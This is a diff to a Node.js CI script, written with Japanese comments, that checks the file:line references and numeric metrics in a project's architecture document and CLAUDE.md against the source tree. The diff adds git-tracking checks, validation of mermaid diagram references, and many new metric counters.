@@ -26,10 +26,39 @@
  */
 'use strict';
 
+const { execFileSync } = require('node:child_process');
 const fs = require('node:fs');
 const path = require('node:path');
+const { stripComments } = require('./lib/strip-non-code.cjs');
+// 「何が送信か」の名前は lint-network-targets と 1 つの一覧を共有する。§3.3 の照合が
+// 別の一覧を持てば、必ずどちらかに無い名前が出る (2026-09-09 に 4 つ抜けていた)。
+const { NETWORK_CALL_NAMES } = require('./lint-network-targets.cjs');
 
 const REPO_ROOT = path.resolve(__dirname, '..');
+
+/**
+ * git が追跡しているファイルの集合。CI の fresh checkout に存在するのは
+ * これだけなので、参照先がここに無ければ「手元だけ通る」参照になる。
+ * git が使えない環境では判定を諦める (null) — 検査できないことを理由に
+ * 誤って落とすほうが害が大きい。
+ */
+const TRACKED = (() => {
+  try {
+    const out = execFileSync('git', ['-C', REPO_ROOT, 'ls-files', '-z'], {
+      encoding: 'utf8',
+      maxBuffer: 64 * 1024 * 1024,
+    });
+    return new Set(out.split('\0').filter(Boolean));
+  } catch {
+    return null;
+  }
+})();
+
+function isTracked(absPath) {
+  if (TRACKED === null) return true; // 判定不能なら通す
+  const rel = path.relative(REPO_ROOT, absPath).split(path.sep).join('/');
+  return TRACKED.has(rel);
+}
 const ARCH_FILE = path.join(REPO_ROOT, 'docs/ARCHITECTURE.md');
 
 // Lines of source context to allow around each cited line / range.
@@ -100,18 +129,23 @@ function parseRef(raw) {
 
 /** Extract symbol candidates from text. Backtick-wrapped identifiers
  *  (camelCase / snake_case / kebab-case) only. */
+/*
+ * 一般語・TypeScript の原始型は記号として数えない。
+ *
+ * **名前を付けて 1 か所に置く** (パス 292) —— `selfTest` は囲まれた側と図の側の
+ * **両方**を 1 つの標本で試すので、標本がこの表に当たる語だと
+ * 「囲まれた側は記号 0 個なので何も検査しない」状態になり、
+ * **自己検査が静かに空になる** (実際にそうなった: `number` が選ばれて 2 件が
+ * 鳴らなくなった)。選ぶ側が同じ表を読めるように export せず module 定数にする。
+ */
+const GENERIC_SYMBOL_RE =
+  /^(file|line|true|false|null|void|string|number|boolean|main|src|clients|action|payload|test|tests|fetch|json|api|data|svc|env|raw|res|err|get|post|put|delete|patch|head|options)$/i;
+
 function extractSymbols(text) {
   const symbols = new Set();
   for (const m of text.matchAll(/`([A-Za-z_][A-Za-z0-9_-]{2,})\(?\)?`/g)) {
     const sym = m[1];
-    // Skip generic words / TypeScript primitives.
-    if (
-      /^(file|line|true|false|null|void|string|number|boolean|main|src|clients|action|payload|test|tests|fetch|json|api|data|svc|env|raw|res|err|get|post|put|delete|patch|head|options)$/i.test(
-        sym,
-      )
-    ) {
-      continue;
-    }
+    if (GENERIC_SYMBOL_RE.test(sym)) continue;
     symbols.add(sym);
   }
   return [...symbols];
@@ -127,6 +161,42 @@ function readFileSafe(p) {
 
 function countOccurrences(text, pattern) {
   return [...text.matchAll(pattern)].length;
+}
+
+/**
+ * 名前つきの配列リテラルの中の `name:` を数える (パス 279)。
+ *
+ * 綴りではなく**構造**で数える —— 規則の表を `[{ name, re }, …]` で持つ走査
+ * (`lint-charset.cjs` の SCRIPT_RANGES / INVISIBLE_RANGES) は、規則が増えれば
+ * 要素が増える。読めなかったときは `null` を返す: 0 を返すと「規則が 0 本でも
+ * 散文が 0 と書いてあれば一致」になり、走査の死が合格に化ける。
+ */
+/**
+ * 判定 census を 1 度だけ走らせて覚える (パス 280)。
+ *
+ * `scripts/shared-judgement-census.cjs` の `census()` は `src/` を歩くので、
+ * 3 つの metric がそれぞれ呼ぶと 3 回歩く。読めなかったら `null` —— 数を 0 に
+ * 倒すと「散文が 0 と書いてあれば一致」になり、走査の死が合格に化ける。
+ */
+let sharedJudgementCensusCache;
+function sharedJudgementCensus() {
+  if (sharedJudgementCensusCache === undefined) {
+    try {
+      sharedJudgementCensusCache = require('./shared-judgement-census.cjs').census();
+    } catch {
+      sharedJudgementCensusCache = null;
+    }
+  }
+  return sharedJudgementCensusCache;
+}
+
+function countNamedEntries(relFile, constName) {
+  const src = readFileSafe(path.join(REPO_ROOT, relFile));
+  if (src === null) return null;
+  const m = src.match(new RegExp(`const ${constName} = \\[([\\s\\S]*?)\\n\\];`));
+  if (m === null) return null;
+  const n = countOccurrences(m[1], /\bname:\s*'/g);
+  return n === 0 ? null : n;
 }
 
 // ---------------------------------------------------------------------------
@@ -160,6 +230,24 @@ function verifyReferences(archText) {
           archLine: lineNo,
           ref: fullRef,
           reason: `file not found: ${path.relative(REPO_ROOT, refPath)}`,
+        });
+        continue;
+      }
+
+      // 手元にあっても **git 管理外なら CI の fresh checkout には無い**。
+      // つまり「ローカルは green・CI は file not found で落ちる」を作る。
+      // 2026-08-11 に実際に踏んだ: dist/standalone.html を追跡から外した直後、
+      // ARCHITECTURE.md にバッククォート付きで書いたため、作業ツリーには
+      // 生成物が残っていてローカルだけ通った。存在確認では検出できないので
+      // **追跡されているか**を見る。
+      if (!isTracked(refPath)) {
+        failures.push({
+          archLine: lineNo,
+          ref: fullRef,
+          reason:
+            `git 管理外のパスを参照しています (${path.relative(REPO_ROOT, refPath)})。` +
+            ' 手元にはあっても CI の fresh checkout には存在せず、CI だけが落ちます。' +
+            ' 生成物を指すならバッククォートを外して文章で書いてください。',
         });
         continue;
       }
@@ -224,13 +312,416 @@ function verifyReferences(archText) {
   return { successCount, failures };
 }
 
+/**
+ * **図の中の `file:line` も検査する** (2026-09-12 · パス 180)。
+ *
+ * `verifyReferences` が見るのは**バッククォートで囲まれた**参照だけ
+ * (`REF_RE` が `` ` `` を要求する)。ところが ARCHITECTURE.md には mermaid の
+ * クラス図という**第 2 の書き方**が在り、そこでは囲まれていない:
+ *
+ * ```
+ *   class SkillsGuards~clients/skills.ts~ {
+ *     +isSafeSkillName(id) : skills.ts:367
+ *   }
+ * ```
+ *
+ * この形は 27 件在って、**1 件も検査されていなかった**。2026-09-12 に当ててみたら
+ * **23 件 (85%) がずれていた** (`setToken` は `secrets.ts:73` と書かれているが実際は 68、
+ * `generatePkce` は 98 と書かれて実際は 311、など)。文書の参照の 1/8 が、
+ * 「自己検証している」という見出しの下で腐っていた。
+ *
+ * 規則は囲まれた側と同じ —— **記号が ±SYMBOL_WINDOW 行の帯に居ること**。
+ * ただし記号の取り方が違う: 囲まれた側は参照の**手前の散文**から `` `sym` `` を拾うが、
+ * 図では `+sym(args) : file:line` の形なので行から直に取る。
+ */
+/*
+ * **括弧は必須ではない** (パス 292)。
+ *
+ * 2026-09-15 まで `\([^)]*\)` を**必須**にしていた。mermaid のクラス箱には
+ * 関数以外の成員 —— 定数や型 —— も並ぶので、それらは `+NAME : file.ts:NNN` と
+ * 括弧なしで書かれる。すると:
+ *
+ *   - 図の走査は**括弧**を要求するので見ない
+ *   - 散文の走査は**バッククォート**を要求するので見ない
+ *
+ * ので **どの網にも映らない**。実測 (パス 292): mermaid の中の
+ * 「名前 : ファイル:行」29 件のうち **2 件** (`OAUTH_CONFIGS : oauth.ts` /
+ * `FetchError : types.ts`) が誰にも検査されていなかった。そのうち
+ * `OAUTH_CONFIGS` は `oauth.ts:54` = **ブロックコメントを閉じる行**を指していて、
+ * パス 291 で私が手で直すまで**誰も鳴らなかった**。
+ *
+ * ★ 括弧の代わりに**可視性の印** (`+` / `-` / `~`) を要求する ——
+ * 「散文の中の `foo : bar.ts:1` を拾わない」という元の意図はそちらで果たせる
+ * (クラス箱の成員は必ず印を持つ)。印も括弧も無い行は今までどおり無視する。
+ *
+ * ★ **旧い self-test の 1 行が、この穴を「意図」として留めていた** ——
+ * `['引数の括弧が無ければ図の参照ではない', '+justAName : x.ts:1', 0, 25]`。
+ * 標本の `justAName` は**実在しない名前**なので、
+ * 「散文を拾わない」と「実在する成員を黙って飛ばす」を**見分けられない**。
+ * パス 289 (過剰の対照が穴を意図として留めた) / パス 291 (検査の題名が弱さを
+ * 仕様として書いた) と同じ家系で、**3 パス連続**である。
+ */
+const DIAGRAM_REF_RE =
+  /^\s*(?:([+\-~])\s*)?([A-Za-z_][A-Za-z0-9_]*)\s*(\([^)]*\))?\s*:\s*([A-Za-z][A-Za-z0-9./_-]*\.(?:ts|tsx|cjs))\s*:\s*(\d+)/;
+
+/** 図の 1 行から参照を取る (取れなければ null)。`selfTest` から呼べるよう分けてある。 */
+function parseDiagramRef(line) {
+  const m = DIAGRAM_REF_RE.exec(line);
+  if (!m) return null;
+  const [, marker, symbol, parens, file, lineNo] = m;
+  // 印も括弧も無ければ図の成員ではない (散文の `foo : bar.ts:1` を拾わないため)。
+  if (!marker && !parens) return null;
+  return { symbol, file, line: Number(lineNo) };
+}
+
+/**
+ * その行はコメント (散文) か。
+ *
+ * 行頭が `//`・`*`・ブロックコメントの開始か終了なら散文とみなす。途中の行も
+ * このリポジトリの書き方では必ず `*` 始まりなので拾える (完璧な字句解析ではないが、
+ * **見落とす向きではなく厳しい向きに外れる** —— 拾いすぎれば「散文だけ」と
+ * 判定されて鳴るので、人が見て直すことになる)。
+ */
+/**
+ * 記号が**コードとして**その行に現れるか (パス 292)。
+ *
+ * 2026-09-15 まで `line.includes(sym)` だけを見ており、**言及と宣言を
+ * 見分けていなかった**。実測した 2 つの通り方:
+ *
+ *   1. **docblock の使用例** —— `+setToken(id, token) : secrets.ts:73` の
+ *      73 行目は本文ではなく `*   setToken('notion', …) → 成功を返す` という
+ *      **説明の例**で、実際の宣言は **263 行目** (190 行の隔たり)。
+ *   2. **文字列リテラル** —— `+authorize(config) : oauth.ts:258` の帯には
+ *      `authorizeUrl: 'https://public-api.wordpress.com/oauth2/authorize'` が
+ *      在り、**URL の末尾**が記号名と一致していた。実際の `authorize` は
+ *      **775 行目** (517 行の隔たり)。
+ *
+ * だから「コメント行ではない」かつ「引用符の外」を要求する。
+ *
+ * ★ **この規則を散文 ref (`verifyReferences`) には掛けない。** 実測 (パス 292):
+ * 記号が照合されている 125 組のうち、引用符の外を要求すると **51 組が落ちる** ——
+ * action 名 (`'create-issue'`) とヘッダ名 (`'x-api-key'`) は**文字列としてしか
+ * 存在し得ない**ので、それは偽陽性である。図の 29 件は全部クラス箱の**成員**
+ * (= 宣言が在る物) なので、そこだけを締める。母集団の性質が違えば規則も違う。
+ */
+function symbolAppearsAsCode(line, sym) {
+  // 引用符の中身を落としてから探す (URL の末尾が記号名と一致する形を弾く)。
+  return line.replace(/'[^']*'|"[^"]*"|`[^`]*`/g, '').includes(sym);
+}
+
+function verifyDiagramRefs(archText) {
+  const failures = [];
+  let successCount = 0;
+
+  archText.split('\n').forEach((line, idx) => {
+    const ref = parseDiagramRef(line);
+    if (!ref) return;
+    const lineNo = idx + 1;
+    const fullRef = `${ref.file}:${ref.line}`;
+    const refPath = resolveRef(ref.file);
+
+    if (!fs.existsSync(refPath) || !isTracked(refPath)) {
+      failures.push({
+        archLine: lineNo,
+        ref: fullRef,
+        reason: `図の参照が解決できません (${path.relative(REPO_ROOT, refPath)})`,
+      });
+      return;
+    }
+
+    const srcArr = readFileSafe(refPath).split('\n');
+    // **注記は共有の字句解析器で落としてから**記号を探す (行番号は保たれる)。
+    // 行頭で見る述語では `foo(); // setToken(...)` のような**行末の注記**が
+    // 宣言として数えられた (パス 292 が閉じた形の、行末での現れ · パス 463)。
+    const codeArr = stripComments(readFileSafe(refPath)).split('\n');
+    if (ref.line < 1 || ref.line > srcArr.length) {
+      failures.push({
+        archLine: lineNo,
+        ref: fullRef,
+        reason: `図の参照が範囲外 (${srcArr.length} 行のファイル)`,
+      });
+      return;
+    }
+
+    const lo = Math.max(1, ref.line - SYMBOL_WINDOW);
+    const hi = Math.min(srcArr.length, ref.line + SYMBOL_WINDOW);
+    // **コードとしての出現**を要求する (パス 292) —— docblock の使用例や
+    // URL リテラルの末尾一致では満たされない。
+    const inWindow = codeArr
+      .slice(lo - 1, hi)
+      .some((l) => symbolAppearsAsCode(l, ref.symbol));
+    if (!inWindow) {
+      const actual = codeArr
+        .map((l, i) => (symbolAppearsAsCode(l, ref.symbol) ? i + 1 : 0))
+        .filter(Boolean);
+      // 散文だけで満たされていた場合は、それを名指しする —— 「見つからない」と
+      // 出すと「名前が消えた」と読めてしまい、直し方が分からない。
+      const proseOnly = actual.length === 0
+        && srcArr.slice(lo - 1, hi).some((l) => l.includes(ref.symbol));
+      failures.push({
+        archLine: lineNo,
+        ref: fullRef,
+        reason:
+          `図の記号 "${ref.symbol}" drifted: cited near line ${ref.line} but actually at line(s) `
+          + `${actual.slice(0, 4).join(', ') || '(コードとしては見つからない)'}`
+          + (proseOnly ? ' —— 帯に在るのは**散文か文字列の中だけ**です (宣言を指してください)' : '')
+          + ` (${path.relative(REPO_ROOT, refPath)})`,
+      });
+      return;
+    }
+    successCount++;
+  });
+
+  /*
+   * **走査が死んだら鳴る** (パス 65 の生存下限)。図を書き換えて 1 件も取れなくなったら
+   * 「0 件で全部一致」と報告してしまうので、実測より下がったら落とす。
+   * 2026-09-12 の実測は 27 件。
+   */
+  const FLOOR = 20;
+  if (successCount + failures.length < FLOOR) {
+    failures.push({
+      ref: '図の参照',
+      reason:
+        `図の参照が ${successCount + failures.length} 件しか取れませんでした (下限 ${FLOOR})。`
+        + ' mermaid の書き方が変わったか走査が死んでいます —— 0 件は「全部一致」ではありません。',
+    });
+  }
+
+  return { successCount, failures };
+}
+
 // ---------------------------------------------------------------------------
 // Phase 2 — live metric verification
 // ---------------------------------------------------------------------------
 
 /** Each metric extracts a number from ARCHITECTURE.md and compares
  *  it to a freshly-computed value from the source tree. */
+/*
+ * 自己検査を**別名のスクリプトで**走らせているゲートの台帳。
+ * `vault:check` は `build-knowledge-vault.cjs --check && safe-vault-write.cjs` で、
+ * 後者は引数なしで走らせると封じ込めの自己検査そのものになる。
+ * 台帳は双方向 —— 名前から `self-test` が消えたら、ここに載っていない限り数が減る。
+ */
+const SELF_TEST_ALIASES = new Set(['vault:check']);
+
+/** `verify:all` が連ねているゲート名。 */
+function verifyAllGates(scripts) {
+  return (scripts['verify:all'] || '')
+    .split('&&')
+    .map((x) => x.trim().replace(/^npm run /, ''))
+    .filter(Boolean);
+}
+
+/** 陰性対照 (self-test) を持つゲートかどうか。 */
+function hasSelfTest(gate, scripts) {
+  return /self-test/.test(scripts[gate] || '') || SELF_TEST_ALIASES.has(gate);
+}
+
+/**
+ * 静的な `it(` の数。**2 か所から参照される** —— `docs/ARCHITECTURE.md` の表 (この
+ * ゲートが照合する) と、`scripts/session-context.cjs` (SessionStart hook が新しい
+ * セッションへ最初に見せる greeting)。数え方を写すと、片方だけ直したときに
+ * 「どちらが正しいのか分からない 2 つの数」になる。
+ *
+ * ★ **この警告は実際に当たった (2026-09-26 · パス 481)。** この関数は export されて
+ * いなかったので hook は必然的に写しを持ち、その写しは契約が **2 つの軸で**違って
+ * いた —— 母集団が `.ts|.tsx` (`.test.ts` ではない) で、針が `/^\s*it\(/` (`\s+` では
+ * ない)。実測すると針の軸は今日 **0 件**の差 (列 0 の `it(` はどこにも無い) だが、
+ * 母集団の軸が **1 件**: `src/renderer/__audits__/malformedFieldSweep.audit.ts` は
+ * `vitest.audit.config.ts` だけが拾うので **`npm test` も CI も 1 度も走らせない**。
+ * だから greeting は **16065**、このゲートは **16064** と言い、greeting を信じて
+ * 表を書き換えたセッションはこのゲートを壊す (実際に踏みかけた)。
+ *
+ * 母集団の契約は「**`npm test` が走らせる物**」—— `vitest.config.ts` の `include` は
+ * `src` の下の `__tests__` に在る `.test.ts` だけを拾うので、ここも `.test.ts` だけを歩く。`__audits__/` の
+ * `.audit.ts` は別の config なので数に入れない (入れると、CI が 1 度も走らせない
+ * 検査を「この repo の検査数」として名乗ることになる)。
+ *
+ * コメントアウトされた検査 (`// it(`) は行頭の空白＋`it(` に一致しないので入らない。
+ * ただし**ブロック注記の中の素の `it(`** は一致しうる (実測 2026-09-26 で 0 件・
+ * `stripComments` を通しても答えは 16064 のまま。罠であって生きた欠陥ではない)。
+ */
+function countStaticIts() {
+  let total = 0;
+  const walk = (dir) => {
+    if (!fs.existsSync(dir)) return;
+    for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
+      const full = path.join(dir, e.name);
+      if (e.isDirectory()) walk(full);
+      else if (/\.test\.ts$/.test(e.name)) {
+        const text = readFileSafe(full);
+        total += [...text.matchAll(/^\s+it\(/gm)].length;
+      }
+    }
+  };
+  walk(path.join(REPO_ROOT, 'src'));
+  return total;
+}
+
+/** ゲートのモジュールを読む。読めなければ null (metric は「計算できない」で落ちる)。 */
+function requireSafe(file) {
+  try {
+    return require(file);
+  } catch {
+    return null;
+  }
+}
+
+/**
+ * 台帳の件数を数える助け (パス 145)。**ブロックを切り出してから数える** ——
+ * ファイル全体を grep すると自己検査の合成データや別の台帳まで拾い、
+ * 実測 (`lint:storage` が刷る 21) と食い違う (最初にこれを踏んだ)。
+ */
+function ledgerBlockCount(file, name, open, close, row) {
+  const src = readFileSafe(path.join(REPO_ROOT, file));
+  if (src === null) return null;
+  const m = src.match(new RegExp(`const ${name} = \\${open}([\\s\\S]*?)\\n\\${close};`));
+  return m === null ? null : (m[1].match(row) ?? []).length;
+}
+
+/** `lint-storage-ledger.cjs` の `STORES` に在る、その媒体の行数。 */
+function storesMediumCount(medium) {
+  // `STORES` は**オブジェクト**である (配列と読み違えて null を返し、
+  // 「値が計算できない」で 3 件落とした。ゲートが自分の抽出漏れを捕まえた形)。
+  return ledgerBlockCount(
+    'scripts/lint-storage-ledger.cjs',
+    'STORES',
+    '{',
+    '}',
+    new RegExp(`medium: '${medium}'`, 'g'),
+  );
+}
+
+/** `lint-dependencies.cjs` の台帳 (オブジェクト) の鍵の数。 */
+function depsLedgerCount(name) {
+  return ledgerBlockCount('scripts/lint-dependencies.cjs', name, '{', '}', /^ {2}'?[\w@/-]+'?:/gm);
+}
+
+/** `lint-doi-prefix.cjs` の誌の台帳 (配列) の行数。 */
+function doiLedgerCount(name) {
+  return ledgerBlockCount('scripts/lint-doi-prefix.cjs', name, '[', ']', /^ {2}[[{]/gm);
+}
+
 const METRICS = [
+  {
+    /*
+     * ゲートに陰性対照が付いている数。
+     *
+     * 「CI が遅いから」で `&& … --self-test` を 1 つ外すのは一瞬で、外した
+     * 瞬間から**そのゲートは鳴かなくなっても誰も気づけない**状態に戻る。
+     * 数を doc に書いて突き合わせる。
+     */
+    name: 'gates with a negative control',
+    docPattern: /陰性対照つきゲート \| (\d+) \/ \d+ /,
+    compute: () => {
+      const pkg = JSON.parse(readFileSafe(path.join(REPO_ROOT, 'package.json')) ?? '{}');
+      const scripts = pkg.scripts ?? {};
+      return verifyAllGates(scripts).filter((g) => hasSelfTest(g, scripts)).length;
+    },
+  },
+  {
+    name: 'verify:all gate count',
+    docPattern: /陰性対照つきゲート \| \d+ \/ (\d+) /,
+    compute: () => {
+      const pkg = JSON.parse(readFileSafe(path.join(REPO_ROOT, 'package.json')) ?? '{}');
+      return verifyAllGates(pkg.scripts ?? {}).length;
+    },
+  },
+  {
+    /*
+     * 禁止パターンの数。
+     *
+     * ARCHITECTURE.md はここに **13 個を書き写していた** —— 実体が 26 個に
+     * なっても、走査対象が 57 → 466 ファイルに増えても、どちらも誰も直さな
+     * かった (2026-08-22 に判明)。写した一覧は消して出典へのポインタにし、
+     * 数だけをここで留める。**規則を足したら doc も直さざるを得ない**形。
+     */
+    name: 'forbidden pattern count',
+    docPattern: /\*\*(\d+) 個の禁止パターン\*\*/,
+    compute: () => {
+      const src = readFileSafe(path.join(REPO_ROOT, 'scripts/lint-forbidden-patterns.cjs'));
+      if (src === null) return null;
+      const m = src.match(/const FORBIDDEN_PATTERNS = \[([\s\S]*?)\n\];/);
+      if (!m) return null;
+      // 各規則は `name:` をちょうど 1 つ持つ。self-test の表は配列の外なので入らない。
+      return countOccurrences(m[1], /^\s{4}name:/gm);
+    },
+  },
+  {
+    /*
+     * 走査対象のファイル数。正確な値は増え続けるので下限で留める
+     * (`tracked line count (floor)` と同じ扱い)。狙いは「走査範囲が
+     * 黙って縮んでいないこと」で、上限を当てることではない。
+     */
+    name: 'forbidden-pattern scan scope (floor)',
+    docPattern: /ランタイムソース \*\*≥ (\d+) ファイル\*\*/,
+    mode: 'gte',
+    compute: () => {
+      const { execSync } = require('node:child_process');
+      const out = execSync('node scripts/lint-forbidden-patterns.cjs', {
+        cwd: REPO_ROOT,
+        encoding: 'utf8',
+      });
+      const m = out.match(/Scanned (\d+) runtime source files/);
+      return m ? Number(m[1]) : null;
+    },
+  },
+  {
+    /*
+     * **§3.3 の見出しの「N ホスト」。**
+     *
+     * 2026-09-07 実測: 同じ事実に 4 つの数字が並んでいた ——
+     * 指標表が「14 + ローカル 1」(出典は §4.3 と書いてあったが、あちらは
+     * Ollama の CVE 対応表で、egress マトリクスは §3.3)、§3.3 の見出しが 26、
+     * ゲートの実測が 29。ゲートが見ていたのは「src/main の字面 ⊆ 表」の
+     * **包含だけ**で、要約の数は誰も見ていない。
+     *
+     * 表に 1 行足しても見出しは動かないので、**「下記以外への接続は存在しない」
+     * という絶対の否定を支える数が、静かにずれる**。
+     */
+    name: 'egress host count (§3.3 heading)',
+    docPattern: /### 3\.3 ネットワーク egress マトリクス \((\d+) ホスト/,
+    compute: () => {
+      const doc = readFileSafe(path.join(REPO_ROOT, 'docs/ARCHITECTURE.md'));
+      if (doc === null) return null;
+      const n = documentedEgressHosts(doc).size;
+      return n === 0 ? null : n;
+    },
+  },
+  {
+    /** 指標表の側。見出しと同じ解析から出すので、2 つが揃っていないと落ちる。 */
+    name: 'egress host count (metrics table)',
+    docPattern: /外部接続先ホスト \| (\d+) /,
+    compute: () => {
+      const doc = readFileSafe(path.join(REPO_ROOT, 'docs/ARCHITECTURE.md'));
+      if (doc === null) return null;
+      const n = documentedEgressHosts(doc).size;
+      return n === 0 ? null : n;
+    },
+  },
+  {
+    /*
+     * **不変条件の数。** 見出しの「N 個」・指標表の数・実際の行数の 3 つが
+     * 揃っているか。2026-09-07 実測では表が 1〜16 まで番号を振っているのに、
+     * 見出しと指標表はどちらも 15 のままだった (#16 を足した人が数を直していない)。
+     * 数そのものが「CI が何件を強制しているか」の主張なので、ずれたままにしない。
+     */
+    name: 'invariant count (§8.1 heading)',
+    docPattern: /### 8\.1 不変条件 (\d+) 個/,
+    compute: () => {
+      const doc = readFileSafe(path.join(REPO_ROOT, 'docs/ARCHITECTURE.md'));
+      return doc === null ? null : invariantRowCount(doc);
+    },
+  },
+  {
+    /** 指標表の側。§8.1 の行数から出す。 */
+    name: 'invariant count (metrics table)',
+    docPattern: /不変条件 \(CI で fail-on-violation\) \| (\d+) /,
+    compute: () => {
+      const doc = readFileSafe(path.join(REPO_ROOT, 'docs/ARCHITECTURE.md'));
+      return doc === null ? null : invariantRowCount(doc);
+    },
+  },
   {
     name: 'service count',
     docPattern: /サービス数 \| (\d+) /,
@@ -265,6 +756,56 @@ const METRICS = [
         .filter((l) => !/SCAFFOLD/i.test(l)).length;
     },
   },
+  /*
+   * **判定 census の 3 つの数。** (パス 280)
+   *
+   * `lint:shared-judgement` の説明は「shared 138 / 両ビルド 44 / 否定 21」と書いたまま
+   * だったが、実測は 143 / 62 / 31 —— **3 つとも古い**。44 / 21 はパス 247 が初めて
+   * 数えた値で、census 自身の docblock が
+   *
+   *     パス 247 がこの母集団を初めて数え (44 / 21)、**その数を散文にだけ書いた**
+   *
+   * と**その誤りを名指ししている** (だからパス 248 で生成物にした)。それでも
+   * CLAUDE.md の写しは残り、パス 268 が走査を直して 61 / 31 になったときも
+   * 床だけが引き直された。**生成物にしても、別の場所の写しは別に留めないと腐る。**
+   *
+   * census は `src/` を歩くので 1 度だけ呼んで覚える (3 つの metric で 3 回歩かせない)。
+   */
+  {
+    name: 'CLAUDE.md: shared-judgement census — shared modules',
+    docFile: 'CLAUDE.md',
+    docPattern: /生成ブロックと突き合わせる \(shared (\d+) \//,
+    compute: () => sharedJudgementCensus()?.shared ?? null,
+  },
+  {
+    name: 'CLAUDE.md: shared-judgement census — imported by both builds',
+    docFile: 'CLAUDE.md',
+    docPattern: /両ビルドが\s*#?\s*import (\d+) \//,
+    compute: () => sharedJudgementCensus()?.both ?? null,
+  },
+  {
+    name: 'CLAUDE.md: shared-judgement census — answerable with a refusal',
+    docFile: 'CLAUDE.md',
+    docPattern: /うち否定で答えられる (\d+)。/,
+    compute: () => sharedJudgementCensus()?.judgement ?? null,
+  },
+  /*
+   * **このゲート自身の届く範囲。** (パス 279)
+   *
+   * `docs/ARCHITECTURE.md` の冒頭 (最初に読まれる 1 行) は 2026 年前半から
+   * 「170 個の file:line 参照 + 5 個のライブメトリクス」と書いたままで、実測は
+   * 601 と 37 だった —— **4 倍と 7 倍の過小申告**。同じ文書の §「同じ事実に 4 つの
+   * 数字が並んでいた —— 要約の数を誰も見ていなかった」(2026-09-07) が名指しした
+   * 失敗の形が、**その文書自身の見出しに残っていた**。
+   *
+   * 参照数は既に metric に在ったが (表の 1 行)、要約の行と metric の**個数**は
+   * 誰も見ていなかった。自分の大きさを自分で数える。
+   */
+  {
+    name: 'verify:arch live metric count',
+    docPattern: /(\d+) 個のライブメトリクス/,
+    compute: () => METRICS.length,
+  },
   {
     name: 'verify:arch ref count',
     docPattern: /`file:line` 参照数 \| (\d+) /,
@@ -276,54 +817,424 @@ const METRICS = [
     },
   },
   {
+    /*
+     * **図の中の参照も数える** (パス 180)。バッククォートの参照とは別の書き方なので
+     * 数も別に持つ —— 「542 件」に混ぜると、図が丸ごと消えても外側の数で埋め合わされる。
+     */
+    name: 'verify:arch diagram ref count',
+    docPattern: /図の中の `file:line` 参照数 \| (\d+) /,
+    compute: () => verifyDiagramRefs(readFileSafe(ARCH_FILE) ?? '').successCount,
+  },
+  {
     name: 'OAuth-supported service count',
     docPattern: /OAuth 対応サービス \| (\d+) /,
     compute: () => {
       const src = readFileSafe(path.join(REPO_ROOT, 'src/main/oauth.ts'));
       const m = src.match(/OAUTH_CONFIGS[^=]*= \{([\s\S]*?)^\};/m);
       if (!m) return null;
-      return countOccurrences(m[1], /^\s*[a-z][a-z0-9-]*:\s*\{/gm);
+      return countOccurrences(m[1], /^\s*'?[a-z][a-z0-9-]*'?:\s*\{/gm);
     },
   },
   {
     name: 'unit test count',
     docPattern: /ユニットテスト \| \*\*(\d+)\*\* /,
+    compute: () => countStaticIts(),
+  },
+  {
+    name: 'tracked line count (floor)',
+    // 「≥ N」の下限メトリクス（mode: 'gte'）。100 万行基盤（柱 B）の成長を
+    // フロアで自己検証する — 正確な行数は変動するため固定値比較にしない。
+    docPattern: /追跡行数（リポジトリ全体・下限） \| \*\*≥ (\d+)\*\* /,
+    mode: 'gte',
     compute: () => {
-      // Count `it(` occurrences across all test files. Excludes
-      // commented-out tests (lines starting with //).
+      const { execSync } = require('node:child_process');
+      const names = execSync('git ls-files -z', { cwd: REPO_ROOT, maxBuffer: 64 * 1024 * 1024 })
+        .toString('utf8')
+        .split('\u0000')
+        .filter(Boolean);
       let total = 0;
+      for (const n of names) {
+        try {
+          const b = fs.readFileSync(path.join(REPO_ROOT, n));
+          for (let i = 0; i < b.length; i++) if (b[i] === 10) total++;
+        } catch {
+          /* 削除予定・シンボリックリンク等は読み飛ばす */
+        }
+      }
+      return total;
+    },
+  },
+  // ── CLAUDE.md (Claude Code セッションへの指示書) の数値 ──
+  // ここが腐ると、読んだ側は「テストは 1460 件くらいの小さな束」「禁止は 27 種」
+  // と思って作業する。ARCHITECTURE.md と同じ厳しさで突き合わせる。
+  {
+    /*
+     * vault の規模。**下限**で見る (知識が増える方向にしか動かない)。
+     * 厳密照合にすると知識を 1 件足すたびに doc を直すことになり、
+     * その churn は「直さずに数だけ古くなる」を招く。
+     */
+    name: 'CLAUDE.md: knowledge vault size (floor)',
+    docFile: 'CLAUDE.md',
+    docPattern: /`knowledge-vault\/`, ([\d,]+)\+ notes/,
+    compute: () => {
+      let n = 0;
       const walk = (dir) => {
         if (!fs.existsSync(dir)) return;
         for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
-          const full = path.join(dir, e.name);
-          if (e.isDirectory()) walk(full);
-          else if (/\.test\.ts$/.test(e.name)) {
-            const text = readFileSafe(full);
-            total += [...text.matchAll(/^\s+it\(/gm)].length;
-          }
+          if (e.isDirectory()) walk(path.join(dir, e.name));
+          else if (e.name.endsWith('.md')) n += 1;
         }
       };
-      walk(path.join(REPO_ROOT, 'src'));
-      return total;
+      walk(path.join(REPO_ROOT, 'knowledge-vault'));
+      return n;
+    },
+    mode: 'gte',
+  },
+  /*
+   * **保存先の台帳の件数。**
+   *
+   * この数は台帳 (`lint-storage-ledger.cjs` の `STORES`) と
+   * `docs/DATA_PROTECTION.md` と CLAUDE.md の 3 か所に書かれている。
+   * 2026-08-28、talent の鍵を足したときに CLAUDE.md だけ 20 のまま残り、
+   * `lint:docs` は数を照合しないので**何も鳴らなかった**。
+   * CLAUDE.md はすぐ上の行で「数を 2 か所に書くと必ず食い違うので、
+   * ここには書かない」と書いており、その直下で破れていた。
+   *
+   * 消すのではなく**機械に見せる**ことにした —— この行は
+   * 「lint:storage は何を見ているのか」を読む人に伝える価値があり、
+   * 腐らせない手立てのほうを足すのが筋である。
+   */
+  {
+    name: 'CLAUDE.md: localStorage ledger entry count',
+    docFile: 'CLAUDE.md',
+    docPattern: /localStorage (\d+) \/ sessionStorage/,
+    compute: () => {
+      const src = readFileSafe(path.join(REPO_ROOT, 'scripts/lint-storage-ledger.cjs')) ?? '';
+      const m = src.match(/const STORES = \{([\s\S]*?)\n\};/);
+      if (!m) return null;
+      return (m[1].match(/medium: 'localstorage'/g) ?? []).length;
+    },
+  },
+  /*
+   * **CLAUDE.md の手書きの数のうち、誰も見ていなかった 8 つ** (2026-09-10 · パス 145)。
+   *
+   * すぐ上の localStorage の項目は、2026-08-28 に talent の鍵を足したとき
